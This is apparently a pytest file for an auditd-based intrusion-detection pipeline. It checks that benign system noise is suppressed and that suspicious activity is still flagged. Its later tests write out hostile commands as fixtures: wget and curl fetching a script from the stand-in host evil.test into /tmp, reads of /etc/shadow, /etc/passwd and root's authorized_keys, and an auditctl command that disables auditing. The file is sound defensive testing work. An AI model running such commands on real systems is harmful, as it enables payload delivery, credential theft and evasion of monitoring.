        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_empty_process_file_access": 1}


def test_benign_auditd_local_empty_probe_file_access_is_suppressed():
    probe_cases = (
        "/usr/bin/sleep",
        "/usr/bin/ps",
        "/usr/bin/ss",
        "/home/mslm/.local/bin/ps",
        "/home/mslm/.local/bin/ss",
        "/home/mslm/.nvm/versions/node/v22.0.0/bin/ps",
        "/home/mslm/.nvm/versions/node/v22.0.0/bin/ss",
    )
    for file_path in probe_cases:
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            category="filesystem",
            action="file_access",
            process="",
            user="",
            raw=f'type=PATH msg=audit(1710000000.000:145): item=0 name="{file_path}" nametype=UNKNOWN',
            fields={"audit_type": "PATH", "file_path": file_path},
            message=f"PATH probe UNKNOWN {file_path}",
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_empty_probe_file_access": 1}


def test_benign_auditd_local_path_unknown_probe_is_suppressed_with_basename_counter():
    probe_cases = (
        "/usr/local/bin/systemd-detect-virt",
        "/home/mslm/.local/bin/lsb_release",
        "/home/mslm/.nvm/versions/node/v22.0.0/bin/getconf",
    )
    for file_path in probe_cases:
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            category="filesystem",
            action="file_access",
            process="",
            user="",
            raw=f'type=PATH msg=audit(1710000000.000:245): item=0 name="{file_path}" nametype=UNKNOWN',
            fields={"audit_type": "PATH", "file_path": file_path, "nametype": "UNKNOWN", "oflags": "0"},
            message=f'PATH probe UNKNOWN {file_path}',
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        basename = file_path.rsplit("/", 1)[-1].lower()
        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_path_unknown_probe": 1}
        assert pipeline._auditd_noise_suppressed_stats["by_basename"] == {basename: 1}
        ops = pipeline._ops_status()
        assert ops["telemetry_coverage"]["auditd_noise_suppressed"]["by_reason"] == {"local_path_unknown_probe": 1}
        assert ops["telemetry_coverage"]["auditd_noise_suppressed"]["by_basename"] == {basename: 1}


def test_benign_auditd_runc_shell_loader_with_raw_type_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="runc",
        raw='type=SYSCALL msg=audit(1710000000.000:35): comm="runc" exe="/usr/sbin/runc" a0="/bin/sh" a1="/usr/bin/perl" item=0 name="/proc/self/fd/6"',
        fields={"exe": "/usr/sbin/runc"},
        message="runc internal shell loader",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_dbus_local_socket_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="dbus-daemon",
        raw='type=PATH msg=audit(1710000000.000:33): item=0 name="/run/dbus/system_bus_socket" inode=1 dev=00:14 mode=0140777',
        fields={"audit_type": "PATH", "name": "/run/dbus/system_bus_socket"},
        message="/run/dbus/system_bus_socket",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_vmtoolsd_syscall_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="vmtoolsd",
        raw='type=SYSCALL msg=audit(1710000000.000:36): comm="vmtoolsd" exe="/usr/bin/vmtoolsd" syscall=42',
        fields={"audit_type": "SYSCALL", "exe": "/usr/bin/vmtoolsd"},
        message="vmtoolsd normal syscall",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_networkmanager_syscall_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="NetworkManager",
        raw='type=SYSCALL msg=audit(1710000000.000:37): comm="NetworkManager" exe="/usr/sbin/NetworkManager" syscall=42',
        fields={"audit_type": "SYSCALL", "exe": "/usr/sbin/NetworkManager"},
        message="NetworkManager normal syscall",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_empty_process_internal_exec_is_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        process="",
        raw='type=EXECVE msg=audit(1710000000.000:38): exe="/usr/sbin/runc" a0="/bin/sh" a1="/usr/bin/perl" item=0 name="/proc/self/fd/6"',
        fields={},
        message="internal empty process exec",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []


def test_benign_auditd_numeric_runtime_syscall_is_suppressed_before_duplicate_accounting():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    duplicate_calls = []
    pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
    pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
    event = _auditd_evt(
        process="6",
        raw='type=SYSCALL msg=audit(1710000000.000:39): comm="6" exe="/usr/sbin/runc" auid=4294967295 tty=(none) syscall=59',
        fields={"audit_type": "SYSCALL", "exe": "/usr/sbin/runc"},
        message="EXEC: runc",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    pipeline._runtime_state.record_event.assert_not_called()
    assert inserted == []
    assert duplicate_calls == []
    assert pipeline._event_count == 0
    assert pipeline._source_stats == {}
    assert pipeline._dedup_cache == {}
    assert pipeline._xsrc_dedup_cache == {}
    assert pipeline._pending_event is None
    assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"internal_service_syscall": 1}


def test_benign_auditd_internal_service_syscalls_are_suppressed_before_db_and_phase_accounting():
    for process_name, syscall_no in (
        ("python", 43),
        ("cron", 18),
        ("sh", 18),
        ("snapd", 18),
        ("debian-sa1", 18),
    ):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            process=process_name,
            raw=(
                f'type=SYSCALL msg=audit(1710000000.000:141): comm="{process_name}" '
                f'auid=4294967295 tty=(none) syscall={syscall_no} success=yes'
            ),
            fields={"audit_type": "SYSCALL"},
            message=f"syscall={syscall_no} success=yes auid=4294967295 tty=(none)",
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"internal_service_syscall": 1}


def test_benign_auditd_local_python_runtime_syscalls_are_suppressed_before_db_and_phase_accounting():
    for syscall_no, success_text in (
        (59, "success=no exit=-2"),
        (257, "success=no"),
        (257, "success=yes"),
    ):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            process="python",
            raw=(
                f'type=SYSCALL msg=audit(1710000000.000:144): comm="python" uid=1000 auid=1000 '
                f'syscall={syscall_no} {success_text}'
            ),
            fields={"audit_type": "SYSCALL", "syscall": syscall_no},
            message=f"syscall={syscall_no} {success_text}",
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_python_runtime_syscall": 1}


def test_benign_auditd_local_run_parts_syscall_is_suppressed_before_db_and_phase_accounting():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    duplicate_calls = []
    pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
    pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
    event = _auditd_evt(
        process="run-parts",
        user="0",
        raw='type=SYSCALL msg=audit(1710000000.000:146): comm="run-parts" uid=0 auid=0 tty=(none) syscall=59 success=yes',
        fields={"audit_type": "SYSCALL", "syscall": 59},
        message="syscall=59 success=yes tty=(none)",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_not_called()
    pipeline._runtime_state.record_event.assert_not_called()
    assert inserted == []
    assert duplicate_calls == []
    assert pipeline._event_count == 0
    assert pipeline._source_stats == {}
    assert pipeline._dedup_cache == {}
    assert pipeline._xsrc_dedup_cache == {}
    assert pipeline._pending_event is None
    assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_run_parts_syscall": 1}


def test_benign_auditd_local_terminal_db_control_noise_is_suppressed_before_db_and_phase_accounting():
    cases = (
        _auditd_evt(
            process="psql",
            user="1000",
            src_ip="127.0.0.1",
            raw='type=SYSCALL msg=audit(1710000000.000:146): comm="psql" auid=4294967295 tty=(none) syscall=42 src=127.0.0.1',
            fields={"audit_type": "SYSCALL"},
            message="PostgreSQL connect 127.0.0.1",
        ),
        _auditd_evt(
            process="gnome-terminal",
            user="1000",
            src_ip="0x7f000001",
            raw='type=PATH msg=audit(1710000000.000:147): comm="gnome-terminal" item=0 name="/run/user/1000/bus" nametype=UNKNOWN',
            fields={"audit_type": "PATH", "file_path": "/run/user/1000/bus"},
            category="filesystem",
            action="file_access",
            message="/run/user/1000/bus",
        ),
        _auditd_evt(
            process="userdb",
            user="0",
            src_ip="0x00000001",
            raw='type=SYSCALL msg=audit(1710000000.000:148): comm="userdb" msg="DynamicUser"',
            fields={"audit_type": "SYSCALL"},
            message="DynamicUser",
        ),
        _auditd_evt(
            process="bash",
            user="1000",
            src_ip="socket:[12345]",
            raw='type=PATH msg=audit(1710000000.000:149): comm="bash" item=0 name="/usr/bin/tail" nametype=UNKNOWN',
            fields={"audit_type": "PATH", "file_path": "/usr/bin/tail"},
            category="filesystem",
            action="file_access",
            message="/usr/bin/tail",
        ),
    )
    expected_reasons = (
        "local_terminal_db_control_syscall",
        "local_terminal_db_control_file_access",
        "local_terminal_db_control_syscall",
        "local_terminal_db_control_file_access",
    )

    for event, expected_reason in zip(cases, expected_reasons):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        parse_fail_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.record_parse_fail = lambda: parse_fail_calls.append("parse_fail")
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert parse_fail_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {expected_reason: 1}


def test_pre_normalize_local_control_noise_does_not_increment_parse_fail_and_is_visible_by_source_and_reason():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    parse_fail_calls = []
    pipeline.phase.record_parse_fail = lambda: parse_fail_calls.append("parse_fail")
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: None)})()

    pipeline._process_event_locked(
        'type=PATH msg=audit(1710000000.000:150): comm="gio-launch-desk" name="/run/user/1000/wayland-0"',
        "auditd",
    )

    assert parse_fail_calls == []
    assert pipeline._event_count == 0
    assert pipeline._source_stats == {}
    assert pipeline._parse_fail_suppressed_stats == {
        "total": 1,
        "by_source": {"auditd": 1},
        "by_reason": {"local_control_raw": 1},
    }
    ops = pipeline._ops_status()
    assert ops["telemetry_coverage"]["parse_fail_suppressed"] == pipeline._parse_fail_suppressed_stats

def test_benign_auditd_local_sessionclean_syscalls_are_suppressed_before_db_and_phase_accounting():
    for process_name, syscall_no in (
        ("sed", 59),
        ("sort", 257),
        ("find", 59),
        ("pidof", 257),
        ("expr", 59),
        ("phpquery", 257),
        ("php8.3", 59),
        ("sessionclean", 257),
        ("ionclean", 59),
    ):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            process=process_name,
            user="0",
            raw=(
                f'type=SYSCALL msg=audit(1710000000.000:147): comm="{process_name}" '
                f'auid=4294967295 tty=(none) syscall={syscall_no} success=yes'
            ),
            fields={"audit_type": "SYSCALL", "syscall": syscall_no},
            message=f"syscall={syscall_no} success=yes auid=4294967295 tty=(none)",
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_sessionclean_syscall": 1}


def test_benign_auditd_local_sessionclean_file_access_is_suppressed_before_db_and_phase_accounting():
    for process_name, file_path in (
        ("sed", "/usr/bin/sed"),
        ("sort", "/usr/bin/sort"),
        ("find", "/usr/bin/find"),
        ("pidof", "/usr/bin/pidof"),
        ("expr", "/usr/bin/expr"),
        ("phpquery", "/usr/sbin/phpquery"),
        ("sessionclean", "/usr/lib/php/sessionclean"),
        ("php8.3", "/run/systemd/journal/stdout"),
    ):
        pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
        duplicate_calls = []
        pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
        pipeline.phase.update = Mock(side_effect=AssertionError("phase.update should not run for suppressed auditd noise"))
        event = _auditd_evt(
            category="filesystem",
            action="file_access",
            process=process_name,
            user="0",
            raw=(
                f'type=PATH msg=audit(1710000000.000:148): comm="{process_name}" '
                f'auid=4294967295 tty=(none) item=0 name="{file_path}" nametype=UNKNOWN'
            ),
            fields={"audit_type": "PATH", "file_path": file_path},
            message=file_path,
        )
        pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source, ev=event: ev)})()
        inserted = []
        pipeline.db = type("_DB", (), {
            "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
            "insert_alert": staticmethod(lambda alert: 1),
            "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
            "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
        })()

        pipeline._process_event_locked("raw", "auditd")

        pipeline.detection.analyze.assert_not_called()
        pipeline._runtime_state.record_event.assert_not_called()
        assert inserted == []
        assert duplicate_calls == []
        assert pipeline._event_count == 0
        assert pipeline._source_stats == {}
        assert pipeline._dedup_cache == {}
        assert pipeline._xsrc_dedup_cache == {}
        assert pipeline._pending_event is None
        assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"local_sessionclean_file_access": 1}


def test_benign_auditd_seq_group_is_suppressed_before_duplicate_accounting():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    duplicate_calls = []
    pipeline.phase.record_duplicate = lambda kind="exact": duplicate_calls.append(kind)
    pipeline._refresh_source_coverage = lambda: {"degraded": False}
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    events = iter([
        _auditd_evt(
            process="pg_isready",
            raw='type=EXECVE msg=audit(1710000000.000:99): argc=3 a0="pg_isready" a1="-h" a2="/var/run/postgresql"',
            fields={"audit_type": "EXECVE", "cmdline": "pg_isready -h /var/run/postgresql", "seq": "99"},
            message="pg_isready -h /var/run/postgresql",
        ),
        _auditd_evt(
            process="postgres",
            raw='type=SYSCALL msg=audit(1710000000.000:99): comm="postgres" exe="/usr/lib/postgresql/16/bin/postgres" syscall=42',
            fields={"seq": "99"},
            message="postgres syscall same audit group",
        ),
        _auditd_evt(
            process="postgres",
            raw='type=PATH msg=audit(1710000000.000:99): item=0 name="/var/run/postgresql/.s.PGSQL.5432"',
            fields={"seq": "99"},
            message="postgres path same audit group",
        ),
    ])
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: next(events))})()

    pipeline._process_event_locked("raw1", "auditd")
    pipeline._process_event_locked("raw2", "auditd")
    pipeline._process_event_locked("raw3", "auditd")

    pipeline.detection.analyze.assert_not_called()
    assert inserted == []
    assert duplicate_calls == []
    assert pipeline._dedup_cache == {}
    assert pipeline._auditd_noise_suppressed_stats["total"] == 3
    assert pipeline._auditd_noise_suppressed_stats["by_reason"] == {"pg_isready": 3}
    ops = pipeline._ops_status()
    assert ops["telemetry_coverage"]["auditd_noise_suppressed"] == {
        "total": 3,
        "by_reason": {"pg_isready": 3},
    }
    assert inserted == []


def test_suspicious_auditd_wget_tmp_download_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="exec",
        process="wget",
        raw='type=EXECVE msg=audit(1710000000.000:3): argc=5 a0="wget" a1="https://evil.test/p.sh" a2="-O" a3="/var/tmp/p.sh"',
        fields={"audit_type": "EXECVE", "cmdline": "wget https://evil.test/p.sh -O /var/tmp/p.sh"},
        message="wget https://evil.test/p.sh -O /var/tmp/p.sh",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_suspicious_auditd_curl_tmp_download_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="exec",
        process="curl",
        raw='type=EXECVE msg=audit(1710000000.000:4): argc=5 a0="curl" a1="-fsS" a2="https://evil.test/p.sh" a3="-o" a4="/tmp/p.sh"',
        fields={"audit_type": "EXECVE", "cmdline": "curl -fsS https://evil.test/p.sh -o /tmp/p.sh"},
        message="curl -fsS https://evil.test/p.sh -o /tmp/p.sh",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_sensitive_auditd_shadow_access_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="file_access",
        process="cat",
        raw='type=PATH msg=audit(1710000000.000:51): item=0 name="/etc/shadow" nametype=UNKNOWN',
        fields={"audit_type": "PATH", "file_path": "/etc/shadow", "nametype": "UNKNOWN"},
        message="cat /etc/shadow",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_sensitive_auditd_authorized_keys_access_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="file_access",
        process="cat",
        raw='type=PATH msg=audit(1710000000.000:52): item=0 name="/root/.ssh/authorized_keys" nametype=UNKNOWN',
        fields={"audit_type": "PATH", "file_path": "/root/.ssh/authorized_keys", "nametype": "UNKNOWN"},
        message="cat /root/.ssh/authorized_keys",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_sensitive_auditd_passwd_access_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="file_access",
        process="cat",
        raw='type=PATH msg=audit(1710000000.000:5): item=0 name="/etc/passwd" inode=1 dev=00:14 mode=0100644',
        fields={"audit_type": "PATH", "file_path": "/etc/passwd"},
        message="cat /etc/passwd",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

    pipeline.detection.analyze.assert_called_once()
    assert len(inserted) == 1


def test_auditd_tamper_command_is_not_suppressed():
    pipeline, _ = _make_pipeline(Phase.PHASE_0, active_layers=[])
    event = _auditd_evt(
        action="exec",
        process="auditctl",
        raw='type=EXECVE msg=audit(1710000000.000:61): argc=3 a0="auditctl" a1="-D" a2="-e 0"',
        fields={"audit_type": "EXECVE", "cmdline": "auditctl -D -e 0"},
        message="auditctl -D -e 0",
    )
    pipeline.normalizer = type("_N", (), {"normalize": staticmethod(lambda raw, source: event)})()
    inserted = []
    pipeline.db = type("_DB", (), {
        "insert_event": staticmethod(lambda **kwargs: inserted.append(kwargs)),
        "insert_alert": staticmethod(lambda alert: 1),
        "is_in_cooldown": staticmethod(lambda rule_id, entity_key: False),
        "set_cooldown": staticmethod(lambda rule_id, entity_key, seconds: None),
    })()

    pipeline._process_event_locked("raw", "auditd")

